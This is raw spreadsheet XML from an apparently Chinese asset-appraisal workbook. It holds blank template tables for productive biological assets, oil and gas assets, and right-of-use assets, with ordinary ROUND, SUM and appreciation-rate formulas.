      <c r="J24" s="555" t="n"/>
      <c r="K24" s="552" t="n"/>
      <c r="L24" s="555">
        <f>ROUND(J24*K24/100,-1)</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(I24=0,"",(L24-I24)/I24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B25" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C25" s="593" t="n"/>
      <c r="D25" s="567" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="614">
        <f>ROUND(SUM(F7:F24),2)</f>
        <v/>
      </c>
      <c r="G25" s="115" t="n"/>
      <c r="H25" s="560">
        <f>ROUND(SUM(H7:H24),2)</f>
        <v/>
      </c>
      <c r="I25" s="560">
        <f>ROUND(SUM(I7:I24),2)</f>
        <v/>
      </c>
      <c r="J25" s="560">
        <f>ROUND(SUM(J7:J24),2)</f>
        <v/>
      </c>
      <c r="K25" s="560" t="n"/>
      <c r="L25" s="560">
        <f>ROUND(SUM(L7:L24),2)</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(I25=0,"",(L25-I25)/I25*100)</f>
        <v/>
      </c>
      <c r="N25" s="383" t="n"/>
    </row>
    <row r="26" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>减：生产性生物资产减值准备</t>
        </is>
      </c>
      <c r="C26" s="593" t="n"/>
      <c r="D26" s="567" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="115" t="n"/>
      <c r="H26" s="560" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="552" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555">
        <f>IF(I26=0,"",(L26-I26)/I26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="567" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="614">
        <f>F25-F26</f>
        <v/>
      </c>
      <c r="G27" s="115" t="n"/>
      <c r="H27" s="560">
        <f>H25-H26</f>
        <v/>
      </c>
      <c r="I27" s="560">
        <f>I25-I26</f>
        <v/>
      </c>
      <c r="J27" s="560">
        <f>J25-J26</f>
        <v/>
      </c>
      <c r="K27" s="560">
        <f>K25-K26</f>
        <v/>
      </c>
      <c r="L27" s="560">
        <f>L25-L26</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(I27=0,"",(L27-I27)/I27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="16">
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="J5:L5"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="L3:N3"/>
    <mergeCell ref="B26:D26"/>
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="H5:I5"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B25:D25"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="D5:D6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N27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8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 codeName="Sheet68">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:O29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A7" sqref="A7:A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="13.8333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="13.3333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="8" customWidth="1" style="410" min="6" max="6"/>
    <col width="9" customWidth="1" style="410" min="7" max="7"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="8.33333333333333" customWidth="1" style="410" min="14" max="14"/>
    <col width="7.16666666666667" customWidth="1" style="410" min="15" max="15"/>
    <col width="9" customWidth="1" style="410" min="16" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>油气资产评估明细表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373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="402" t="inlineStr">
        <is>
          <t>表4-11</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>类别</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>矿区（或油田）</t>
        </is>
      </c>
      <c r="E5" s="272" t="inlineStr">
        <is>
          <t>计量
单位</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>形成日期</t>
        </is>
      </c>
      <c r="H5" s="185" t="inlineStr">
        <is>
          <t>来源</t>
        </is>
      </c>
      <c r="I5" s="187" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="J5" s="567" t="n"/>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="L5" s="593" t="n"/>
      <c r="M5" s="567" t="n"/>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="O5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="369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307" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="M6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="N6" s="594" t="n"/>
      <c r="O6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="381" t="n"/>
      <c r="G7" s="578" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="552" t="n"/>
      <c r="M7" s="555">
        <f>ROUND(K7*L7/100,-1)</f>
        <v/>
      </c>
      <c r="N7" s="555">
        <f>IF(J7=0,"",(M7-J7)/J7*100)</f>
        <v/>
      </c>
      <c r="O7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="381" t="n"/>
      <c r="G8" s="578" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="552" t="n"/>
      <c r="M8" s="555">
        <f>ROUND(K8*L8/100,-1)</f>
        <v/>
      </c>
      <c r="N8" s="555">
        <f>IF(J8=0,"",(M8-J8)/J8*100)</f>
        <v/>
      </c>
      <c r="O8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="381" t="n"/>
      <c r="G9" s="578" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="552" t="n"/>
      <c r="M9" s="555">
        <f>ROUND(K9*L9/100,-1)</f>
        <v/>
      </c>
      <c r="N9" s="555">
        <f>IF(J9=0,"",(M9-J9)/J9*100)</f>
        <v/>
      </c>
      <c r="O9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="381" t="n"/>
      <c r="G10" s="578" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="552" t="n"/>
      <c r="M10" s="555">
        <f>ROUND(K10*L10/100,-1)</f>
        <v/>
      </c>
      <c r="N10" s="555">
        <f>IF(J10=0,"",(M10-J10)/J10*100)</f>
        <v/>
      </c>
      <c r="O10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="381" t="n"/>
      <c r="G11" s="578" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="552" t="n"/>
      <c r="M11" s="555">
        <f>ROUND(K11*L11/100,-1)</f>
        <v/>
      </c>
      <c r="N11" s="555">
        <f>IF(J11=0,"",(M11-J11)/J11*100)</f>
        <v/>
      </c>
      <c r="O11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="381" t="n"/>
      <c r="G12" s="578" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="552" t="n"/>
      <c r="M12" s="555">
        <f>ROUND(K12*L12/100,-1)</f>
        <v/>
      </c>
      <c r="N12" s="555">
        <f>IF(J12=0,"",(M12-J12)/J12*100)</f>
        <v/>
      </c>
      <c r="O12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="381" t="n"/>
      <c r="G13" s="578" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="552" t="n"/>
      <c r="M13" s="555">
        <f>ROUND(K13*L13/100,-1)</f>
        <v/>
      </c>
      <c r="N13" s="555">
        <f>IF(J13=0,"",(M13-J13)/J13*100)</f>
        <v/>
      </c>
      <c r="O13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="381" t="n"/>
      <c r="G14" s="578" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="552" t="n"/>
      <c r="M14" s="555">
        <f>ROUND(K14*L14/100,-1)</f>
        <v/>
      </c>
      <c r="N14" s="555">
        <f>IF(J14=0,"",(M14-J14)/J14*100)</f>
        <v/>
      </c>
      <c r="O14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="381" t="n"/>
      <c r="G15" s="578" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="552" t="n"/>
      <c r="M15" s="555">
        <f>ROUND(K15*L15/100,-1)</f>
        <v/>
      </c>
      <c r="N15" s="555">
        <f>IF(J15=0,"",(M15-J15)/J15*100)</f>
        <v/>
      </c>
      <c r="O15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="381" t="n"/>
      <c r="G16" s="578" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="552" t="n"/>
      <c r="M16" s="555">
        <f>ROUND(K16*L16/100,-1)</f>
        <v/>
      </c>
      <c r="N16" s="555">
        <f>IF(J16=0,"",(M16-J16)/J16*100)</f>
        <v/>
      </c>
      <c r="O16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="381" t="n"/>
      <c r="G17" s="578" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="552" t="n"/>
      <c r="M17" s="555">
        <f>ROUND(K17*L17/100,-1)</f>
        <v/>
      </c>
      <c r="N17" s="555">
        <f>IF(J17=0,"",(M17-J17)/J17*100)</f>
        <v/>
      </c>
      <c r="O17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="381" t="n"/>
      <c r="G18" s="578" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="552" t="n"/>
      <c r="M18" s="555">
        <f>ROUND(K18*L18/100,-1)</f>
        <v/>
      </c>
      <c r="N18" s="555">
        <f>IF(J18=0,"",(M18-J18)/J18*100)</f>
        <v/>
      </c>
      <c r="O18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="381" t="n"/>
      <c r="G19" s="578" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="552" t="n"/>
      <c r="M19" s="555">
        <f>ROUND(K19*L19/100,-1)</f>
        <v/>
      </c>
      <c r="N19" s="555">
        <f>IF(J19=0,"",(M19-J19)/J19*100)</f>
        <v/>
      </c>
      <c r="O19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="381" t="n"/>
      <c r="G20" s="578" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="552" t="n"/>
      <c r="M20" s="555">
        <f>ROUND(K20*L20/100,-1)</f>
        <v/>
      </c>
      <c r="N20" s="555">
        <f>IF(J20=0,"",(M20-J20)/J20*100)</f>
        <v/>
      </c>
      <c r="O20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="381" t="n"/>
      <c r="G21" s="578" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="552" t="n"/>
      <c r="M21" s="555">
        <f>ROUND(K21*L21/100,-1)</f>
        <v/>
      </c>
      <c r="N21" s="555">
        <f>IF(J21=0,"",(M21-J21)/J21*100)</f>
        <v/>
      </c>
      <c r="O21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="381" t="n"/>
      <c r="G22" s="578" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="552" t="n"/>
      <c r="M22" s="555">
        <f>ROUND(K22*L22/100,-1)</f>
        <v/>
      </c>
      <c r="N22" s="555">
        <f>IF(J22=0,"",(M22-J22)/J22*100)</f>
        <v/>
      </c>
      <c r="O22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="381" t="n"/>
      <c r="G23" s="578" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="552" t="n"/>
      <c r="M23" s="555">
        <f>ROUND(K23*L23/100,-1)</f>
        <v/>
      </c>
      <c r="N23" s="555">
        <f>IF(J23=0,"",(M23-J23)/J23*100)</f>
        <v/>
      </c>
      <c r="O23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="381" t="n"/>
      <c r="G24" s="578" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="552" t="n"/>
      <c r="M24" s="555">
        <f>ROUND(K24*L24/100,-1)</f>
        <v/>
      </c>
      <c r="N24" s="555">
        <f>IF(J24=0,"",(M24-J24)/J24*100)</f>
        <v/>
      </c>
      <c r="O24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="381" t="n"/>
      <c r="G25" s="578" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="552" t="n"/>
      <c r="M25" s="555">
        <f>ROUND(K25*L25/100,-1)</f>
        <v/>
      </c>
      <c r="N25" s="555">
        <f>IF(J25=0,"",(M25-J25)/J25*100)</f>
        <v/>
      </c>
      <c r="O25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C26" s="593" t="n"/>
      <c r="D26" s="567" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="560">
        <f>ROUND(SUM(F6:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="381" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="560">
        <f>ROUND(SUM(I6:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="560">
        <f>ROUND(SUM(J6:J25),2)</f>
        <v/>
      </c>
      <c r="K26" s="560">
        <f>ROUND(SUM(K6:K25),2)</f>
        <v/>
      </c>
      <c r="L26" s="560" t="n"/>
      <c r="M26" s="560">
        <f>ROUND(SUM(M6:M25),2)</f>
        <v/>
      </c>
      <c r="N26" s="555">
        <f>IF(J26=0,"",(M26-J26)/J26*100)</f>
        <v/>
      </c>
      <c r="O26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>减：油气资产减值准备</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="567" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="560" t="n"/>
      <c r="G27" s="383" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="560" t="n"/>
      <c r="J27" s="560" t="n"/>
      <c r="K27" s="560" t="n"/>
      <c r="L27" s="560" t="n"/>
      <c r="M27" s="560" t="n"/>
      <c r="N27" s="555">
        <f>IF(J27=0,"",(M27-J27)/J27*100)</f>
        <v/>
      </c>
      <c r="O27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="567" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="560">
        <f>F26-F27</f>
        <v/>
      </c>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="560">
        <f>I26-I27</f>
        <v/>
      </c>
      <c r="J28" s="560">
        <f>J26-J27</f>
        <v/>
      </c>
      <c r="K28" s="560">
        <f>K26-K27</f>
        <v/>
      </c>
      <c r="L28" s="560" t="n"/>
      <c r="M28" s="560">
        <f>M26-M27</f>
        <v/>
      </c>
      <c r="N28" s="555">
        <f>IF(J28=0,"",(M28-J28)/J28*100)</f>
        <v/>
      </c>
      <c r="O28" s="383" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="16">
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="B28:D28"/>
    <mergeCell ref="B1:O1"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="O5:O6"/>
    <mergeCell ref="K5:M5"/>
    <mergeCell ref="B2:O2"/>
    <mergeCell ref="B26:D26"/>
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="I5:J5"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="D5:D6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:O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 codeName="Sheet69">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="25.1666666666667" customWidth="1" style="410" min="3" max="4"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="14.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="11.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="8.16666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="10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使用权资产评估明细表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402" t="inlineStr">
        <is>
          <t>表4-12</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="27" customFormat="1" customHeight="1" s="160">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="185" t="inlineStr">
        <is>
          <t>资产名称或内容</t>
        </is>
      </c>
      <c r="D5" s="185" t="inlineStr">
        <is>
          <t>规格型号及其他</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>形成日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>原始发生额</t>
        </is>
      </c>
      <c r="G5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="180" t="n"/>
      <c r="D6" s="381" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555">
        <f>H6-G6</f>
        <v/>
      </c>
      <c r="J6" s="555">
        <f>IF(G6=0,"",I6/G6*100)</f>
        <v/>
      </c>
      <c r="K6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="180" t="n"/>
      <c r="D7" s="381" t="n"/>
